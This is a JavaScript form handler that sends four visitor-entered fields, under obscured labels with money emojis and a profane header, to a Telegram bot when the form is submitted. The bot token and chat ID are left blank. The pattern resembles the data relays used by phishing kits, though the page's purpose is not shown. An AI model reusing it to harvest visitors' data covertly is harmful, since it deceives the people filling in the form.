document.addEventListener("DOMContentLoaded", function () {
  var inputs = document.querySelectorAll(".main-form .input-field");
  var button = document.getElementById("formSecondaryBtn");
  var cityadress = document.getElementById("cityadress");
  var adressname = document.getElementById("adressname");
  var cshb = document.getElementById("cshb");
  var planning = document.getElementById("planning");

  var checkInputs = function () {
    var allFilled = true;
    inputs.forEach(function (input) {
      if (input.value === "") {
        allFilled = false;
      }
    });

    button.disabled = !allFilled;
    if (allFilled) {
      button.classList.remove("disabled");
    } else {
      button.classList.add("disabled");
    }
  };

  inputs.forEach(function (input) {
    input.addEventListener("input", checkInputs);
  });
  button.addEventListener("click", function (e) {
    e.preventDefault();
    submitForm();
  });

  async function submitForm() {
    button.disabled = true;


    ///tg key
    const token = "";
    const chatId = "";
    ///

    
    const message = `
❤️ : ${[" Пиздец нахуй блять!"]}
🔗 V1: ${cityadress.value}
🤑 V2: ${adressname.value}
💸 V3: ${cshb.value}
💸 V4: ${planning.value}
`;

    const apiUrl = `https://api.telegram.org/bot${token}/sendMessage`;

    const payload = {
      text: message,
      chat_id: chatId,
    };
    console.log({ payload });
    try {
      const response = await fetch(apiUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(payload),
      });

      const data = await response.json();

      if (data.ok) {
        console.log("Message sent successfully!");
        window.location.href = "./thanks.html";
      } else {
        console.log("Failed to send the message:", data.description);
      }

      setTimeout(() => {
        const phoneInput = document.getElementById("formPhone");
        phoneInput.value = "";
        spanElement.style.display = "block";
        imgElement.style.display = "none";
        formSum = "";
        formSocial = "";
        closeForm();
      }, 3000);
    } catch (error) {
      console.error("There was an error sending the message:", error);
    } finally {
      // Re-enable the button
      console.log("message", message);
      button.disabled = false;
    }
  }
});
